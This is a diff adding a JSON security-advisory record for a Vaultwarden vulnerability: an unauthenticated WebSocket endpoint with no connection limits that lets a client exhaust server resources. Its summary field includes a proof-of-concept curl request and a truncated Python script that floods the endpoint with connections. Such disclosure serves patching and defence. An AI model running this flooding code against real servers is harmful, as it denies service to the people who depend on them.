@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-96f7-78q5-j345",
+  "aliases": [],
+  "title": "Unauthenticated WebSocket connection flooding on /notifications/anonymous-hub (resource-exhaustion DoS)",
+  "summary": "# Unauthenticated WebSocket connection flooding on `/notifications/anonymous-hub` (resource-exhaustion DoS)\r\n\r\n## Summary\r\nThe anonymous notifications WebSocket endpoint `GET /notifications/anonymous-hub?token=<...>`\r\naccepts and upgrades WebSocket connections **without any authentication and without any\r\nconnection/rate limit**. Each accepted connection allocates a long-lived async task, an mpsc\r\nchannel, a global-map entry, a periodic timer and a socket/file descriptor, and stays open\r\nindefinitely. A single unauthenticated client can therefore open an unbounded number of\r\npersistent connections and exhaust server resources (tasks, memory, file descriptors),\r\ndegrading or denying the notifications/live-sync service - including the passwordless-login\r\nnotification channel - for all users.\r\n\r\nA secondary issue: the global subscription map is keyed by the **client-supplied `token`** and\r\nuses last-writer-wins `insert`, allowing a client to overwrite (evict) another subscriber that\r\nused the same token.\r\n\r\n## Affected version\r\n- **Vaultwarden 1.36.0 and earlier** (confirmed on 1.36.0, git `f21a3ada`); the endpoint dates back to login-with-device support.\r\n- Fixed in **1.37.0**.\r\n\r\n## Details\r\nSource: `src/api/notifications.rs` (1.36.0)\r\n\r\n```rust\r\n#[get(\"/anonymous-hub?<token..>\")]                                   // line 190 - NO auth guard\r\nfn anonymous_websockets_hub<'r>(ws: WebSocket, token: String, ip: ClientIp)\r\n    -> Result<rocket_ws::Stream!['r], Error> {\r\n    ...\r\n    let (tx, rx) = tokio::sync::mpsc::channel::<Message>(100);        // per-conn channel (buffer 100)\r\n    subscriptions.map.insert(token.clone(), tx);                     // global DashMap, attacker-chosen key\r\n    ...\r\n    // rocket_ws::Stream! { ... interval(Duration::from_secs(15)) ... } // per-conn task + 15s keep-alive timer\r\n}\r\n```\r\n\r\nContrast with the **authenticated** hub `websockets_hub` (line 107), which validates the token\r\nvia `crate::auth::decode_login(&token)` before accepting. `anonymous_websockets_hub` performs no\r\nsuch validation - `token` is an arbitrary attacker-controlled string that is never checked and is\r\nused directly as the subscription-map key.\r\n\r\nPer accepted connection the server allocates:\r\n- one Tokio task running the stream loop,\r\n- one `tokio::sync::mpsc` channel (capacity 100 `Message`s),\r\n- one entry in the process-global `WS_ANONYMOUS_SUBSCRIPTIONS` `DashMap`,\r\n- one 15-second `tokio::time::interval` timer (keep-alive ping → no idle timeout closes the socket),\r\n- one TCP/TLS socket + file descriptor.\r\n\r\nThere is **no authentication, no per-IP connection cap, and no global cap** on these connections.\r\n\r\n## Proof of Concept\r\nTested against a stock `vaultwarden/server:1.36.0` container (default config), no credentials used.\r\n\r\n**1. A single unauthenticated connection is upgraded (arbitrary token, no `Authorization`):**\r\n```bash\r\ncurl -sk -i --http1.1 \\\r\n  -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\r\n  -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" \\\r\n  \"http://TARGET:8088/notifications/anonymous-hub?token=$(uuidgen)\"\r\n# -> HTTP/1.1 101 Switching Protocols\r\n```\r\nFor comparison the authenticated hub without a token is rejected:\r\n```bash\r\ncurl ... \"http://TARGET:8088/notifications/hub\"   # -> HTTP/1.1 401 Unauthorized\r\n```\r\n\r\n**2. No connection limit - 60 concurrent connections from a single IP are all accepted:**\r\n```python\r\nimport socket, threading, base64, os\r\nHOST, PORT = \"TARGET\", 8088\r\nok = [0]; socks = []; lock = threading.Lock()\r\ndef one(i):\r\n    s = socket.create_connection((HOST, PORT), timeout=6)\r\n    key = base64.b64encode(os.urandom(16)).decode()\r\n    req = (f\"GET /notifications/anonymous-hub?token={i:08x}-0000-0000-0000-000000000000 HTTP/1.1\\r\\n\"\r\n           f\"Host: {HOST}\\r\\nConnection: Upgrade\\r\\nUpgrade: websocket\\r\\n\"\r\n           f\"Sec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: {key}\\r\\n\\r\\n\")   # no Authorization\r\n    s.sendall(req.encode())\r\n    if \"101\" in s.recv(...",
+  "published_at": "2026-10-03T20:04:00.000Z",
+  "modified_at": "2026-10-03T20:04:00.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 5.3,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-400",
+    "CWE-770"
+  ],
+  "affected": [
+    {
+      "product": "vaultwarden",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "1.37.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-96f7-78q5-j345",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-96f7-78q5-j345",
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-96f7-78q5-j345",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+  "note": null
+}
